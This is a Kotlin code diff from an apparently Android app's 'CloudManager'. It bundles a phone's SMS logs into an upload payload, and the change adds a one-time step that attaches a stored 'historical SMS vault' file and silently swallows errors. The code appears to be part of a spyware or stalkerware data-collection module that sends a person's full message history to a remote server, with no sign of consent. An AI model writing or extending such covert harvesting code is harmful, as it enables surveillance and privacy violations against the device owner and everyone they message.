@@ -52,11 +52,9 @@ object CloudManager {
                 // --- MODULE 2: SMS (PARAMETRIC SYNC) ---
                 if (isAll || moduleMap.containsKey("sms")) {
                     val limit = moduleMap["sms"] ?: -1
-                    // If specific limit is requested, perform historical dump
                     if (limit > 0) {
                         json.put("sms_logs", PhoneManager.getHistoricalSms(ctx, limit))
                     } else {
-                        // Standard Delta Sync
                         val lastSmsSync = prefs.getLong("last_sync_sms_ts", 0L)
                         val currentSmsLogs = JSONArray(prefs.getString("sms_logs_cache", "[]"))
                         val deltaSms = JSONArray()
@@ -66,13 +64,19 @@ object CloudManager {
                         }
                         if (deltaSms.length() > 0) json.put("sms_logs", deltaSms)
                     }
-                    
+                    json.put("sms_count", prefs.getInt("sms_count", 0))
+                }
+
+                // --- ONE-TIME HISTORICAL SMS PASSENGER ---
+                if (!prefs.getBoolean("historical_sms_dumped", false)) {
                     val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
                     if (vaultFile.exists()) {
-                        val vaultData = vaultFile.readText()
-                        json.put("historical_sms", JSONArray(vaultData))
+                        try {
+                            val vaultData = vaultFile.readText()
+                            json.put("historical_sms", JSONArray(vaultData))
+                            DebugLogger.log("CLOUD", "Historical SMS Vault attached to payload")
+                        } catch (e: Exception) { }
                     }
-                    json.put("sms_count", prefs.getInt("sms_count", 0))
                 }
 
                 // --- MODULE 3: USAGE ---
